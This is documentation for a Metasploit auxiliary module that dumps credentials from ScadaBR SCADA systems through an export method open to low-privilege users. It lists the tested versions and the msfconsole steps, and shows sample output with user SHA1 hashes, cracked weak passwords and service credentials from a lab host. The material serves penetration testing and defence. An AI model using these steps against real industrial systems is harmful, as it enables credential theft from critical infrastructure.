## Description

  This module retrieves credentials from ScadaBR, including service credentials and unsalted SHA1 password hashes for all users, by invoking the `EmportDwr.createExportData` DWR method of Mango M2M which is exposed to all authenticated users regardless of privilege level.


## Vulnerable Application

  ScadaBR is a SCADA (Supervisory Control and Data Acquisition) system with applications in Process Control and Automation, being developed and distributed using the open source model.

  This module has been tested successfully with ScadaBR versions 1.0 CE and 0.9 on Windows and Ubuntu systems.

  Installers:

  * [Windows Installers](https://sourceforge.net/projects/scadabr/files/Software/Installer%20Win32/)
  * [Linux Installers](https://sourceforge.net/projects/scadabr/files/Software/Linux/)
  * [Tomcat WAR files](https://sourceforge.net/projects/scadabr/files/Software/WAR/)


## Verification Steps

  1. Start `msfconsole`
  2. Do: `use auxiliary/admin/http/scadabr_credential_dump`
  3. Do: `set rhost [IP]`
  4. Do: `set username [USERNAME]`
  5. Do: `set password [PASSWORD]`
  6. Do: `run`
  7. You should get credentials


## Scenarios

  ```
  [+] 172.16.191.166:8080 Authenticated successfully as 'admin'
  [+] 172.16.191.166:8080 Export successful (4436 bytes)
  [+] Found 5 users
  [*] Found weak credentials (admin:admin)
  [*] Found weak credentials (user:password)
  [*] Found weak credentials (zxcv:zxcv)

  ScadaBR User Credentials
  ========================

   Username  Password  Hash (SHA1)                               Admin  E-mail
   --------  --------  -----------                               -----  ------
   admin     admin     d033e22ae348aeb5660fc2140aec35850c4da997  true   admin@yourMangoDomain.com
   operator            ef0cade28a5696433326749bb57c39104ca33550  false  operator@localhost
   test                86f7e437faa5a7fce15d1ddcb9eaeaea377667b8  false  test@localhost
   user      password  5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8  true   user@localhost
   zxcv      zxcv      9878e362285eb314cfdbaa8ee8c300c285856810  false  zxcv@localhost


  ScadaBR Service Credentials
  ===========================

   Service     Host       Port  Username       Password
   -------     ----       ----  --------       --------
   HTTP proxy  127.0.0.1  8080  proxytestuser  proxytestpass
   SMTP        127.0.0.1  25    smtptestuser   smtptestpass

  [+] Config saved in: /root/.msf4/loot/20170527210941_default_172.16.191.166_scadabr.config_861842.txt
  [*] Auxiliary module execution completed
  ```

